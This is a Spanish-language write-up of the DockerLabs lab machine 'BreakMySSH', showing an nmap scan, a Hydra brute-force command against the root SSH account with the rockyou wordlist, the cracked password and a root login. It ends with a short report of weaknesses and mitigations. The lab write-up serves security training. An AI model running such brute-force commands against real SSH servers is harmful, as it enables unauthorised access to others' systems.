# BreakMySSH

> Único puerto SSH; fuerza bruta con Hydra sobre root revela la contraseña y da acceso directo como root.

| | |
|---|---|
| **Plataforma** | DockerLabs |
| **Dificultad** | Muy fácil |
| **Objetivo** | `172.17.0.2` |
| **Servicios** | 22/tcp (SSH) |
| **Saltos de usuario** | 1 |

**Tags:** `SSH` · `Hydra` · `Fuerza bruta`

---

## Reconocimiento

```bash
$ sudo nmap -p- -sS -sV --min-rate=5000 -n -Pn --open 172.17.0.2
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH
```

Solo hay SSH (22). Como no hay más superficie, pruebo fuerza bruta directamente.

## Explotación · fuerza bruta sobre root

```bash
$ hydra -l root -P /usr/share/wordlists/rockyou.txt -t 16 -vV ssh://172.17.0.2
[22][ssh] host: 172.17.0.2   login: root   password: estrella
```

Las credenciales son directamente de **root : estrella**.

```bash
$ ssh root@172.17.0.2
# whoami
root
```

La contraseña encontrada es la del propio usuario root, así que el acceso ya es total: no hace falta escalar. Máquina BreakMySSH completada.

---

## Informe · vulnerabilidades y mitigaciones

### 🔴 CRÍTICA — Contraseña de root débil accesible por fuerza bruta

`CWE-521` · A07:2021 – Identification and Authentication Failures

**Impacto.** La contraseña de root es de diccionario y el SSH no limita los intentos, dando acceso root directo.

**Mitigación.** Contraseña robusta, bloqueo de intentos (fail2ban) y, preferiblemente, autenticación por clave.

### 🟡 MEDIA — Login SSH directo de root habilitado

`CWE-250` · A05:2021 – Security Misconfiguration

**Impacto.** Permitir el acceso directo de root por SSH expone la cuenta más crítica del sistema al ataque.

**Mitigación.** PermitRootLogin no (o prohibit-password) y operar con un usuario sin privilegios + sudo.

---

_Writeup de **BreakMySSH** · DockerLabs · por [ak1t4](https://github.com/ak1ta4)_
